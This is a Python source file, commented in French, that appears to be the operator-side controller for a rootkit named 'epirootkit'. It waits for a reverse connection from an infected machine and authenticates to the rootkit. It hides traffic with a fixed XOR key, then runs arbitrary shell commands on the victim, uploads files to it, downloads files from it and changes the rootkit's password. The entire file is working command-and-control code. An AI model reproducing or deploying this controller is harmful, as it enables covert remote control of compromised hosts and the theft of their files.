import socket
import getpass
import os
import sys
import time

LISTEN_IP = "0.0.0.0"  # écoute sur toutes les interfaces
PORT = 4242
KEY = b"epirootkit"

def xor(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def send(sock, text):
    encrypted = xor(text.encode(), KEY)
    sock.sendall(encrypted)

def recv(sock):
    data = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
        if len(chunk) < 4096:
            break
    return xor(data, KEY).decode(errors="ignore")

def upload_file(sock, local_path, remote_path):
    if not os.path.exists(local_path):
        print(f"[-] Fichier {local_path} non trouvé")
        return False

    with open(local_path, 'rb') as f:
        data = f.read()
        size = len(data)
        command = f"upload {remote_path} {size}"
        send(sock, command)
        time.sleep(0.1)  # Attendre que le rootkit soit prêt
        sock.sendall(data)
        response = recv(sock)
        print(response)
        return "success" in response.lower()

def download_file(sock, remote_path, local_path):
    command = f"download {remote_path}"
    send(sock, command)
    with open(local_path, 'wb') as f:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            f.write(data)
    print(f"[+] Fichier téléchargé: {local_path}")
    return True

def change_password(sock, new_password):
    command = f"auth change {new_password}"
    send(sock, command)
    response = recv(sock)
    print(response)
    return "success" in response.lower()

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((LISTEN_IP, PORT))
        server.listen(1)
        print(f"[+] En attente de connexion sur {LISTEN_IP}:{PORT} ...")
        sock, addr = server.accept()
        with sock:
            print(f"[+] Connexion reçue de {addr[0]}:{addr[1]}")
            # Authentification
            password = getpass.getpass("Mot de passe: ")
            send(sock, f"auth {password}")
            response = recv(sock)
            if response.strip() != "OK":
                print("[-] Authentification échouée.")
                return
            print("[+] Authentifié.")
            while True:
                cmd = input("$ ")
                if cmd.strip().lower() in ("exit", "quit"):
                    break
                elif cmd.startswith("upload "):
                    try:
                        _, local_path, remote_path = cmd.split()
                        upload_file(sock, local_path, remote_path)
                    except ValueError:
                        print("Usage: upload local_path remote_path")
                elif cmd.startswith("download "):
                    try:
                        _, remote_path, local_path = cmd.split()
                        download_file(sock, remote_path, local_path)
                    except ValueError:
                        print("Usage: download remote_path local_path")
                elif cmd.startswith("passwd "):
                    try:
                        _, new_password = cmd.split()
                        change_password(sock, new_password)
                    except ValueError:
                        print("Usage: passwd new_password")
                else:
                    send(sock, f"exec {cmd}")
                    output = recv(sock)
                    print(output)

if __name__ == "__main__":
    main()
